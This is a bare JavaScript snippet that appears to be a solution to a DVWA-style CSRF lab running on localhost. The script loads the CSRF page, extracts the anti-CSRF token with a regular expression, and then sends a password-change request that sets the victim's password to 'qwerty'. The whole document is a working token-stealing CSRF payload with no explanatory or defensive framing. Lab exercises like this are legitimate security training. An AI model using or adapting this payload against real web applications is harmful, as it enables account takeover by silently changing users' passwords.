a = new XMLHttpRequest();
a.open('GET', 'http://localhost:9999/vulnerabilities/csrf/');
a.send();
a.onload = () => {
  if (a.readyState == 4 && a.status == 200) {
    t = a.response.substr(a.response.search(/[0-9a-zA-Z]{32}/), 32);
    b = new XMLHttpRequest();
    b.open('GET', 'http://localhost:9999/vulnerabilities/csrf/?password_new=qwerty&password_conf=qwerty&Change=Change&user_token=' + t);
    b.send();
  } else {
    console.log(a.status);
  }
};